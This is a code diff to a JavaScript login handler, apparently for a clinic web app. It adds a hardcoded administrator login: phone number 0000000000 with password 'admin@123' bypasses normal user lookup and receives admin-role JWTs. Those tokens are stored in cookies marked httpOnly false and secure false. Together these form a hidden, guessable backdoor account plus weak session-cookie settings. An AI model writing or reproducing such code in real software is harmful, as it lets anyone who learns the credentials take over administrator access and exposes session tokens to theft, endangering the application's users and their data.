@@ -29,6 +29,30 @@ const postLoginPage = async (req, res) => {
     }
 
     const phoneNumber = parseInt(form.phone);
+    
+    // Check for admin login (phone: 0000000000, password: admin@123)
+    if (phoneNumber === 0 && form.password === 'admin@123') {
+        const sessionInfo = {
+            userId: 'admin',
+            userAgent: req.headers['user-agent']
+        }
+
+        const session = await createSession(sessionInfo);
+        if (!session) {
+            return res.redirect('/auth/login?error=' + encodeURIComponent('Failed to create session. Please try again.'));
+        }
+
+        const accessToken = generateJWT({ id: 'admin', username: 'Admin', sid: session._id.toString(), phone: 0, role: "admin" }, ACCESS_TOKEN_EXPIRE);
+        const refreshToken = generateJWT({ sid: session._id.toString(), role: "admin" }, REFRESH_TOKEN_EXPIRE);
+
+        const baseCookieConfig = { httpOnly: false, sameSite: 'strict', secure: false };
+
+        res.cookie("accessToken", accessToken, { maxAge: convertTime(ACCESS_TOKEN_EXPIRE), ...baseCookieConfig });
+        res.cookie("refreshToken", refreshToken, { maxAge: convertTime(REFRESH_TOKEN_EXPIRE), ...baseCookieConfig });
+        
+        return res.redirect('/admin/dashboard');
+    }
+    
     const user = await getUserByNumber(phoneNumber);
     const clinic = await getClinicByNumber(phoneNumber);
 
